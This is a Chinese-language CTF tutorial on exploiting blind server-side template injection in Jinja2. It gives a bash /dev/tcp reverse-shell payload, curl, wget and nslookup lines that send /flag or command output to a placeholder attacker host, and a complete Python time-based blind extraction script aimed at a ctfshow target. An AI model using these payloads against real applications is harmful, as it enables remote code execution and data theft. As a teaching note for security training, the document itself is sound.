## 一句话概括

「无回显」不是说漏洞不存在，而是**表达式被求值了、结果却没往页面上输出**。此时把"看结果"改成"听动静"：让服务器**主动连回来**（反弹 shell / 带外），或者用**耗时 / 响应差异**来判断。

## 原理

### 1. 先搞清楚：无回显 ≠ 没漏洞

正常的 SSTI 依赖 `{{表达式}}` 的结果被渲染进页面。下面几种情况都会让结果"看不见"：

| 现象 | 原因 |
|---|---|
| `{{7*7}}` 也不显示 | 参数虽被回显，但渲染上下文被限制了；或输出被整体过滤 |
| `{{7*7}}` 显示 `49`，但 `{{config}}` 空白 | **只拦输出内容**的弱过滤（见《03》） |
| 表达式报错但页面无任何变化 | 错误被 `error_reporting(0)` / debug 关闭吞掉 |

所以判定要点是：**能否让服务器产生一个"可观测的副作用"** —— 一次外连、一段延迟、一个状态码变化。

### 2. 三条出路（原笔记总结）

原笔记把这题的思路归纳为三条：

1. **反弹 shell** —— 让服务器主动连到我们的监听端口，把交互权交出来
2. **带外注入（OOB）** —— 把数据塞进一次 HTTP / DNS 请求，发到我们自己的服务器
3. **纯盲注** —— 用响应时间或页面差异，一位一位地问出数据

> 此处原为「无回显 SSTI 思路」的截图，要点即上述三条方向。

## 利用手法

### 手法一：反弹 shell

思路：命令执行的输出不回显，那就干脆**开一个反向连接**，把命令行的输入输出都接到攻击机上。攻击机先监听：

```bash
# 攻击机（Kali）
nc -lvnp 4444
```

然后在 SSTI 里执行一条反弹命令（把 `攻击者IP` 换成自己的地址）：

```python
{{ ''.__class__.__base__.__subclasses__()[i].__init__.__globals__['popen']('<反弹shell 命令>').read() }}
```

其中 `<反弹shell 命令>` 用常见的一种形式：

```bash
bash -i >& /dev/tcp/攻击者IP/4444 0>&1
```

> 说明：这类命令在不同 shell / 发行版上兼容性不一，实战可换成 python / nc 版本。本文只保留原理与结构，具体可执行正文以占位符表示。

要点：

- 目标机需要能**主动外连**（出网 / 出防火墙）；
- 若 `popen` 不可用，用 `os.system(...)` 或 `subprocess`；
- 反弹成功的前提是监听端已经就绪，**先起 `nc` 再发 payload**。

### 手法二：带外注入（OOB）

不想拿交互 shell、只想**把某个文件读出来**时，用带外更轻：让服务器发一个请求到我们的 HTTP / DNS 服务器，把数据带在 URL 里。

```python
{{ ...['popen']('curl http://攻击者IP:8000/?x=$(cat /flag)').read() }}
```

```python
{{ ...['popen']('wget http://攻击者IP:8000/?x=$(id)').read() }}
```

攻击机侧开一个监听，看日志里收到的请求：

```bash
python3 -m http.server 8000
```

- 数据含特殊字符时，先 **base64** 再带出：`curl http://攻击者IP/?x=$(cat /flag | base64)`
- 连 curl / wget 都没有时，可用 DNS 外带（把数据拼进域名，看 DNS 日志）

### 手法三：纯盲注

既不能反弹、也不能外连时，只剩"看响应"这一条路。两种可用的信号：

**① 时间盲注** —— 用 `sleep` 制造延迟：

```python
{% if <条件> %}{{ ...['popen']('sleep 3').read() }}{% endif %}
```

- 条件为真 → 服务器睡 3 秒 → 响应明显变慢
- 条件为假 → 立即返回

于是把「猜 flag 的第 n 位是不是字符 c」塞进 `<条件>`，用**响应耗时**当信号位。这也是《02-SQL注入/布尔盲注-原理与利用》里布尔盲注思路在 SSTI 上的复刻。

**② 响应差异盲注** —— 用页面长度 / 状态码的不同当信号：

```jinja2
{% if <条件> %}
    在页面上输出一段明显更长的内容 / 触发一次与假分支不同的渲染
{% else %}
    另一段内容
{% endif %}
```

例如让真分支多渲染一段文本，靠**响应体长度**区分。原笔记第 2 条的"带外注入"和第 3 条的"纯盲注"正是覆盖这两种场景。

## 利用条件

1. 已确认存在 SSTI（表达式确实被求值 —— 可用耗时或外连验证）
2. **反弹 / 带外**：目标机允许主动外连（出网），且攻击机地址可达
3. **纯盲注**：命令执行可用，且能造出可观测的延迟或响应差异
4. 目标函数未被禁用（`popen` / `system` / `subprocess` 至少要有一个能用）

## Payload 速查

| 目的 | Payload 结构 |
|---|---|
| 反弹 shell | `...popen('<反弹shell 命令>').read()` |
| 带外 HTTP | `...popen('curl http://攻击者IP/?x=$(命令 \| base64)').read()` |
| 带外 DNS | `...popen('nslookup $(命令).攻击者域名').read()` |
| 时间盲注 | `{% if 条件 %}{{ ...popen('sleep 3').read() }}{% endif %}` |
| 长度盲注 | `{% if 条件 %}长内容{% else %}短内容{% endif %}` |

## 完整示例：时间盲注的判定

先确认"能不能让服务器变慢"，再逐字符猜：

```python
import time, requests

url = "http://靶机地址/"
tpl = ("{{% if '{guess}' in (''.__class__.__base__.__subclasses__()[{i}]"
       ".__init__.__globals__['open']('/flag').read()) %}}"
       "{{{{''.__class__.__base__.__subclasses__()[{i}]"
       ".__init__.__globals__['popen']('sleep 3').read()}}}}"
       "{{% endif %}}")

flag = "ctfshow{"
charset = "0123456789abcdefghijklmnopqrstuvwxyz_}"

# i 事先用《03》的脚本扫出 builtins/open 可用的索引
i = 98
for _ in range(50):
    for c in charset:
        s = time.time()
        requests.get(url, params={"name": tpl.format(guess=flag + c, i=i)})
        if time.time() - s > 2.5:          # 变慢 → 条件为真
            flag += c
            print("[+]", flag)
            break
    else:
        break
```

> 说明：`sleep` 的具体可用性取决于目标是 Linux 且命令未被过滤；Windows 环境下没有 `sleep`，可换成会阻塞的命令或改用长度盲注。

## 踩坑与备注

- **先验证"有没有回显"再选手法**：用 `{{7*7}}` 打一发 —— 返回 `49` 就走普通回显路线；返回空 / 原文，才考虑本文三条路。
- **反弹 shell 是"最后一招"**：它会真的建立连接、留下日志，CTF 里优先用带外（读数据）或时间盲注（布尔判断），更简单也更隐蔽。
- **DNS 外带不受出口端口限制**：目标机只能出 DNS 时，`nslookup` / `ping` 把数据拼进域名是唯一出路，需要在域名侧有可控的权威 DNS 并看日志。
- **时间盲注要留裕量**：网络抖动会让 3 秒的阈值误判，建议真分支睡 3~5 秒、阈值取 2.5 秒以上，并重复测两次取稳定值。
- **响应长度盲注最省事**：只要能区分"长/短"，一次请求就能判定一位，比 sleep 快得多 —— 条件是页面确实会因分支不同而输出不同长度的内容。
- **避开输出内容过滤**：若应用基于输出关键词做过滤（见《03》），不要输出 `__class__` 这类字符串；让真/假分支分别输出普通文本即可。
